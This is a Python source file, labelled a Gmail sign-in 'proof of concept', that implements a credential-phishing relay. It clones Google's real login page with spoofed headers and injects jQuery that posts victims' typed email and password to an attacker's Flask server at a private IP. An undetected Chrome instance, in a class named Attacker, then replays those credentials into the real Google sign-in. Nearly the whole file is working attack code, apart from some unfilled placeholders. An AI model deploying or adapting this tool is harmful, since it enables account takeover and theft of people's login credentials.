from selenium.webdriver.support import expected_conditions as EC
from flask import Flask, send_file, make_response, request
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.common.by import By
from urllib.request import urlopen, Request
from datetime import datetime, timedelta
from os import walk, path, makedirs
from fake_headers import Headers
import undetected_chromedriver
from bs4 import BeautifulSoup
from chardet import detect
from typing import Dict
from re import compile
from time import sleep

# gmail signin page (proof of concept)
def generate_profiles():
    earliest_folder = None
    current_date = datetime.now()
    earliest_date = timedelta.max
    filepath = path.expanduser('~') + r'\.wdm\drivers\chromedriver'
    for root, dirs, files in walk(filepath):
        version_numbers = path.basename(root).split('.')
        if ''.join(version_numbers).isdigit() and len(root.split('\\')) == 8:
            creation_date = datetime.fromtimestamp(path.getctime(root))
            date_difference = current_date - creation_date
            if date_difference < earliest_date:
                earliest_date = date_difference
                earliest_folder = root
    new_folder = earliest_folder + f'\\profiles'
    if not path.exists(new_folder):
        makedirs(new_folder)
    return new_folder

def jquery_injector(response, html_name: str, code_injection: str, isEmailPage: bool = True,
    code_splitter: str = 'f=N(e,a,g,"",null);'):
    if isEmailPage:
        # add code for hyperlinks in the email page...
        response = bytes(response)
        soup = BeautifulSoup(response, 'lxml', from_encoding=detect(response)['encoding'])
        soup.find('body').insert_after(soup.new_tag('script',
        src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js'))
        target = soup.find_all('script', {'nonce': compile(r'^\S{22}')}, True)[4]
        split_code = target.text.split(code_splitter)
        split_code[0] += code_splitter
        split_code.insert(1, code_injection)
        target.string = ''.join(split_code)
        with open(html_name, 'w', encoding='UTF-8') as file:
            file.write(str(soup))
    else:
        # add code for hyperlinks in the password page...
        split_code = response.split('</body>')
        split_code[0] += '</body>'
        split_code.insert(1, '<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>')
        new_code = ''.join(split_code)
        split_code = new_code.split(code_splitter)
        split_code[0] += code_splitter
        split_code.insert(1, code_injection)
        new_code = ''.join(split_code)
        with open(html_name, 'w', encoding='UTF-8') as file:
            file.write(new_code)

class Attacker:
    def __init__(self):
        self.options = undetected_chromedriver.ChromeOptions()
        # run it as debugger (https://chromedevtools.github.io/devtools-protocol/)
        self.options.add_argument(fr'--remote-debugging-port={9222}')
        self.options.add_argument(fr'--user-data-dir={generate_profiles()}')
        self.browser = undetected_chromedriver.Chrome(options=self.options)

    def login_page(self, email_dict: Dict | None, password_dict: Dict = None):
        passwordSelector = '#password>div.aCsJod.oJeWuf>div>div.Xb9hP>input'
        if email_dict is not None and password_dict is None:
            self.browser.maximize_window()  # maximize window....
            self.browser.get(f'https://accounts.google.com/AccountChooser?Email={email_dict["email"]}')
            self.browser.find_element(By.CSS_SELECTOR, '#identifierNext>div>button>span').click()
            WebDriverWait(self.browser, 5).until(EC.visibility_of_element_located((By.CSS_SELECTOR,
            passwordSelector)))
            jquery_injector(self.browser.page_source, 'password_page.html',
            'if(f.event.which===13||f.event.type==="checkbox"&&$(f.event.target).is("#selectionc1")||f.event.type==="click"&&$(f.event.target).is("#passwordNext>div>button>span")){var p=$("input[type=password]").val();$.post("http://192.168.254.116:5000/postPassword",{"password":p});return false;}', False)
        elif email_dict is None and password_dict is not None:
            self.browser.find_element(By.CSS_SELECTOR, passwordSelector).send_keys(password_dict['password'])
            self.browser.find_element(By.CSS_SELECTOR, '#passwordNext>div>button>span').click()

app = Flask(__name__)
attacker = Attacker()
@app.route('/')
def index():
    result = make_response(send_file('email_page.html'))
    result.headers.add('Access-Control-Allow-Origin', 'http://192.168.254.116:5000')
    result.headers.add('X-XSS-Protection', '1; mode=block')
    result.headers.add('X-Frame-Options', 'SAMEORIGIN')
    return result

@app.route('/postEmail', methods=['POST'])
def postEmail():
    result = request.values.to_dict()
    print(result)
    if result['email'] != '':
        attacker.login_page(email_dict=result)
    return 'ok'

@app.route('/Password')
def Password():
    password_page = 'password_page.html'
    while True:
        if path.exists(password_page):
            result = make_response(send_file(password_page))
            result.headers.add('Access-Control-Allow-Origin', 'http://{your_ip}:{your_port}')
            result.headers.add('X-XSS-Protection', '1; mode=block')
            result.headers.add('X-Frame-Options', 'SAMEORIGIN')
            return result
        else:
            sleep(5)  # Use this to avoid DOS/timing attacks...

@app.route('/postPassword', methods=['POST'])
def postPassword():
    result = request.values.to_dict()
    print(result)
    if result['password'] != '':
        attacker.login_page(None, result)
    return 'ok'


if __name__ == "__main__":
    jquery_injector(urlopen(Request('https://accounts.google.com/ServiceLogin', headers=Headers(browser='chrome',
    os='win', headers=True).generate())).read(), 'email_page.html', 'if(f.event.which===13||f.event.type==="click"&&$(f.event.target).is("#identifierNext>div>button>span")){var e=$("input[type=email]").val();$.post("http://{your_ip}:{your_port}/postEmail",{"email":e},function(){window.location="http://192.168.254.116:5000/Password"});return false;}')
    app.run(host=f'{your_ip}', port=f'{your_port}')
